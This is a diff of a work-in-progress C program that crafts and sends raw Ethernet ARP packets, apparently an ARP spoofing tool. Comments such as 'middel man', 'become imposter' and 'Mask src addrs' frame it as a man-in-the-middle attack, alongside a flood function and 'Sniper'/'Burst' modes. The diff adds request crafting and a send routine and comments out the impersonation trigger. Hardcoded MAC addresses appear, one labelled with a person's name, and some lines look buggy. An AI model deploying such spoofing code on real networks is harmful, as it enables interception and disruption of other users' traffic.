@@ -8,7 +8,7 @@
 #include <net/if.h>
 #include <arpa/inet.h>
 #include <linux/if_packet.h>
-// #include <netinet/ether.h>
+#include <linux/if_arp.h>
 
 //ARP file
 #define ARP_TABEL  "/proc/net/arp"
@@ -64,6 +64,7 @@ void writeToFile(unsigned char *data, int len,unsigned char *fileName);
 void getTargetInfo(unsigned char *target);
 int  find(char *buffer, char *pattern, int len);
 void craftArpRequestPayload(unsigned char *targetIP);
+void deploy(unsigned char *payload, int payloadSize);
 
 void flood();
 
@@ -91,6 +92,8 @@ const int TARGET = 71; //152;
 
 unsigned char broadcast_Add[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 unsigned char zero_Add[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+unsigned char test_TAdd[6] = {0xd0, 0x17, 0xc2, 0x9c, 0x41, 0x6f}; //Naveenj
+                              
 //Mask src addrs
 unsigned char srcAddr[6] = {0xd0, 0x17, 0xc2, 0x9c, 0x42, 0x28};
 unsigned char own_mac_Add[6] = {0x9c,0x5c,0x8e,0x8e,0x6e,0xbe}; //middel man
@@ -101,7 +104,7 @@ unsigned char ipAdd[4]   =  {0xC0,0xA8,0x01,0x98}; //152
 
 
 //Dep;loy
-void deploy(){
+void deploy1(){
    
    int newSock = socket(AF_PACKET, SOCK_RAW, htons(0x0003));
    
@@ -183,7 +186,7 @@ void craftPayload(){
       memcpy(arp_packet_replay.TPA_4, arp_packet.SPA_4, 2);        
 
     printf("\nPayload Crafted ...");
-    deploy();
+    // deploy();
 } 
 
 
@@ -209,9 +212,9 @@ void flood(){
                 ll_sock_disc.sll_family   = AF_PACKET; // AF_PACKET *default
                 ll_sock_disc.sll_protocol = htons(0x0003); // Not required  0 for nothing
                 ll_sock_disc.sll_ifindex  = interface_index;
-                ll_sock_disc.sll_hatype   = 0; // Not required  0 for nothing
-                ll_sock_disc.sll_pkttype  = '0'; // Not required  0 for nothing
-                ll_sock_disc.sll_halen    = '6';
+                ll_sock_disc.sll_hatype   = 1;//0 // Not required  0 for nothing
+                ll_sock_disc.sll_pkttype  = htons(PACKET_BROADCAST); //'0'; // Not required  0 for nothing
+                ll_sock_disc.sll_halen    = 0x06;//'6';
                 memcpy(ll_sock_disc.sll_addr, payload, 6);
                 
                 //Bind
@@ -233,14 +236,16 @@ void flood(){
 }
 
 
-
-
 void main(){
  
  int mode = 1;
  
  getInterface();
  
+ //
+ //  flood();
+ //  return;
+ //
  printf("\n\n ** Mode **\nSniper : 1 \nBurst : 0\n=>");
  scanf("%d",&mode);
 
@@ -380,20 +385,30 @@ void decodeEther(unsigned char *buf, EtherNetFram *eth ,int debug){
         printf("\n src => %02X:%02X:%02X:%02X:%02X:%02X",buf[6],buf[7],buf[8],buf[9],buf[10],buf[11]);
         printf("\n type => %02X:%02X",buf[12],buf[13]);
       } 
-       memcpy(eth,buf,14);
+      memcpy(eth,buf,14);
 }
 
 
  //Decode ARP
 void decodeARP(unsigned char *buf, ARP_Packet *arp , int debug){
- memcpy(arp, &buf[14], 28);
- // if Some one is looking for target then help him !..
- //  printf("\n Arp trafic...");
 
-    if((int)arp_packet.TPA_4[1] == TARGET && arp_packet.OPER[1] == 0x01 || debug == 1){
+ if(buf!=NULL){ 
+  memcpy(arp, &buf[14], 28);
+  }
+ else{
+  memcpy(&arp_packet, &arp, 28);
+  printf("\n buf is null");
+  }
+  
+ // if Some one is looking for target then help him !..
+      printf("\n Arp trafic...");
+
+    // if((int)arp_packet.TPA_4[1] == TARGET && arp_packet.OPER[1] == 0x01 || debug == 1){
         printf("\n Htype %02X,%02X",arp_packet.HTYPE[0],arp_packet.HTYPE[1]);
-        printf("\n Ptype :%02x",arp_packet.PTYPE[0]);
+        printf("\n Ptype :%02x:%02x",arp_packet.PTYPE[0],arp_packet.PTYPE[1]);
         printf("\n OPER  :%02X,%02X",arp_packet.OPER[0],arp_packet.OPER[1]);
+        printf("\n HLEN :%02X",arp_packet.HLEN[0]);
+        printf("\n PLEN :%02X",arp_packet.PLEN[0]);
         if(arp_packet.OPER[1] == 0x01){
         printf("  Request");
         }
@@ -406,10 +421,10 @@ void decodeARP(unsigned char *buf, ARP_Packet *arp , int debug){
         printf("\n THA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet.THA_2[0],arp_packet.THA_2[1], arp_packet.THA_4[0],arp_packet.THA_4[1], arp_packet.THA_6[0],arp_packet.THA_6[1]);
         printf("  TPA => %d.%d.%d.%d \n\n",(int)arp_packet.TPA_2[0],(int)arp_packet.TPA_2[1], (int)arp_packet.TPA_4[0],(int)arp_packet.TPA_4[1]);
 
-        //become imposter
-        if((int) arp_packet.TPA_4[1] == TARGET && debug == 0)
-        craftPayload();
-    }
+        // //become imposter
+        // if((int) arp_packet.TPA_4[1] == TARGET && debug == 0)
+        // craftPayload();
+    // }
 }
 
 
@@ -452,9 +467,11 @@ void getTargetInfo(unsigned char * target){
       while( c != EOF && !targetFound);
 
       //
+       printf("\n arp cache file closed :%d",fclose(arpCache) );
       if(!targetFound){
        //boradcast arp request
        printf("\n Target Not found in ARP Tabel.");
+       craftArpRequestPayload(target_bin);
       }
 
     }
@@ -477,16 +494,19 @@ int find(char *buffer, char *pattern, int len){
 
 //Craft ARP request payload
 void craftArpRequestPayload(unsigned char *targetIP){
+     
+     printf("\n Crafting ARP Request payload...\n");
   //eth header
-      memcpy(eth_replay.src_addr, own_mac_Add, 6);
-      memcpy(eth_replay.dst_addr, broadcast_Add, 6);
-      eth_replay.type =  0x0806;
+      memcpy(eth_replay.src_addr, &own_mac_Add, 6);
+      memcpy(eth_replay.dst_addr, &broadcast_Add, 6);
+      eth_replay.type =  htons(0x0806);
       
     //Arp Header
       arp_packet_replay.HTYPE[0] = 0x00;
       arp_packet_replay.HTYPE[1] = 0x01;
-      arp_packet_replay.PTYPE[0] = 0x00;
-      arp_packet_replay.PTYPE[1] = 0x08;
+      
+      arp_packet_replay.PTYPE[0] = 0x08;
+      arp_packet_replay.PTYPE[1] = 0x00;  // ETH_P_IP 0x0800
       
       arp_packet_replay.HLEN[0]  = 0x06; // Hardware address len
       arp_packet_replay.PLEN[0]  = 0x04; // Protocol address len 
@@ -499,8 +519,8 @@ void craftArpRequestPayload(unsigned char *targetIP){
       memcpy(arp_packet_replay.SHA_4 , &own_mac_Add[2], 2);
       memcpy(arp_packet_replay.SHA_6 , &own_mac_Add[4], 2);
 
-      memcpy(arp_packet_replay.SPA_2 , arp_packet.TPA_2, 2);
-      memcpy(arp_packet_replay.SPA_4 , arp_packet.TPA_4, 2);
+      memcpy(arp_packet_replay.SPA_2 , &own_ip_Add, 2);
+      memcpy(arp_packet_replay.SPA_4 , &own_ip_Add[2], 2);
 
       //Destination 
       memcpy(arp_packet_replay.THA_2, &zero_Add, 2);
@@ -509,12 +529,99 @@ void craftArpRequestPayload(unsigned char *targetIP){
       
       arp_packet_replay.TPA_2[0] = 0x0;
       arp_packet_replay.TPA_2[1] = 0x0;
+
       arp_packet_replay.TPA_4[0] = 0x0;
       arp_packet_replay.TPA_4[1] = 0x0;
 
-     // memcpy(arp_packet_replay.TPA_2, arp_packet.SPA_2, 2);
-     // memcpy(arp_packet_replay.TPA_4, arp_packet.SPA_4, 2);        
+      memcpy(arp_packet_replay.TPA_2, &target_bin, 2);
+      memcpy(arp_packet_replay.TPA_4, &target_bin[2], 2);        
 
       printf("\nPayload Crafted ...");
 
+        // //Debug crafted Eth 
+        // printf("\n dst => %02X:%02X:%02X:%02X:%02X:%02X",eth_replay.dst_addr[0], eth_replay.dst_addr[1], eth_replay.dst_addr[2], eth_replay.dst_addr[3], eth_replay.dst_addr[4], eth_replay.dst_addr[5]);
+        // printf("\n src => %02X:%02X:%02X:%02X:%02X:%02X",eth_replay.src_addr[0], eth_replay.src_addr[1], eth_replay.src_addr[2], eth_replay.src_addr[3], eth_replay.src_addr[4], eth_replay.src_addr[5]);
+        // printf("\n type => %04X",eth_replay.type);
+
+        // //Debug crafted Arp  
+        // printf("\n Htype %02X,%02X",arp_packet_replay.HTYPE[0],arp_packet_replay.HTYPE[1]);
+        // printf("\n Ptype :%02x:%02x", arp_packet_replay.PTYPE[0], arp_packet_replay.PTYPE[1]);
+        // printf("\n OPER  :%02X,%02X",arp_packet_replay.OPER[0],arp_packet_replay.OPER[1]);
+        // if(arp_packet_replay.OPER[1] == 0x01){
+        // printf("  Request");
+        // }
+        // else{
+        // printf("  Replay");
+        // }
+
+        // printf("\n SHA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet_replay.SHA_2[0],arp_packet_replay.SHA_2[1], arp_packet_replay.SHA_4[0],arp_packet_replay.SHA_4[1], arp_packet_replay.SHA_6[0],arp_packet_replay.SHA_6[1]);
+        // printf("  SPA => %d.%d.%d.%d",(int)arp_packet_replay.SPA_2[0],(int)arp_packet_replay.SPA_2[1], (int)arp_packet_replay.SPA_4[0],(int)arp_packet_replay.SPA_4[1]);
+        // printf("\n THA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet_replay.THA_2[0],arp_packet_replay.THA_2[1], arp_packet_replay.THA_4[0],arp_packet_replay.THA_4[1], arp_packet_replay.THA_6[0],arp_packet_replay.THA_6[1]);
+        // printf("  TPA => %d.%d.%d.%d \n\n", (int)arp_packet_replay.TPA_2[0], (int)arp_packet_replay.TPA_2[1], (int)arp_packet_replay.TPA_4[0],(int)arp_packet_replay.TPA_4[1]);
+      
+
+      //Send
+      unsigned char payload[14+28];
+      memcpy(payload, &eth_replay, 14);
+      memcpy(&payload[14], &arp_packet_replay, 28);
+      
+      deploy(payload, sizeof(payload));
+
+      decodeEther(payload,&eth,1);
+      decodeARP(payload,&arp_packet,1);
+
 }
+
+
+//Send 
+//Dep;loy
+void deploy(unsigned char *payload, int payloadSize){
+   printf("\n Deploying Payload ....");
+
+   int newSock = socket(AF_PACKET, SOCK_RAW, htons(0x0003));
+   
+   if(newSock > 0){
+      printf("\n Deploying socket is created ....");
+
+                // initialize link layer sock discriptor 
+                ll_sock_disc.sll_family   = AF_PACKET; // AF_PACKET *default
+                ll_sock_disc.sll_protocol = htons(0x0003); // Not required  0 for nothing
+                ll_sock_disc.sll_ifindex  = interface_index;
+                ll_sock_disc.sll_hatype   = 0; // Not required  0 for nothing
+                ll_sock_disc.sll_pkttype  = '0'; // Not required  0 for nothing
+                ll_sock_disc.sll_halen    = '6';
+                memcpy(ll_sock_disc.sll_addr, payload, 6);
+      
+
+       //debug ll sock
+       printf("\n\n family :%d",ll_sock_disc.sll_family);
+       printf("\n protocol :%d",ll_sock_disc.sll_protocol);
+       printf("\n if index :%d",ll_sock_disc.sll_ifindex);
+       printf("\n hatype :%d",ll_sock_disc.sll_hatype);
+       printf("\n pkt type :%c",ll_sock_disc.sll_pkttype);
+       printf("\n ha-len :%02x",ll_sock_disc.sll_halen);
+       printf("\n addre :=> %02x:%02x:%02x:%02x:%02x:%02x",ll_sock_disc.sll_addr[0], ll_sock_disc.sll_addr[1], ll_sock_disc.sll_addr[2], ll_sock_disc.sll_addr[3], ll_sock_disc.sll_addr[4], ll_sock_disc.sll_addr[5]);
+       
+       printf("\n LL Sock discriptor size :%d",(int) sizeof(ll_sock_disc));
+
+      
+        //Bind
+         int bindStatus = bind(newSock, (struct sockaddr *)&ll_sock_disc, sizeof (ll_sock_disc) );
+         printf("\n\n bind status :%d, errorCode :%d",bindStatus,errno); 
+        
+        //Send               
+        // int status = sendto(newSock, payload, sizeof(payload), 0,  (struct sockaddr*)&ll_sock_disc, sizeof(ll_sock_disc));
+        //int status = send(newSock, &payload, payloadSize,0);
+        int status = send(newSock, payload, 42, 0);
+        
+        if(status == -1)
+        printf("\n\n Deploy status :%d, errorNo:%d\n",status,errno);
+        else
+        printf("\nPayload Deployed succesfuly  %d.\n",errno);
+        
+   }
+   else{
+     printf("\n Deploying socket cretion failed  :%d",errno);
+   }
+}
+
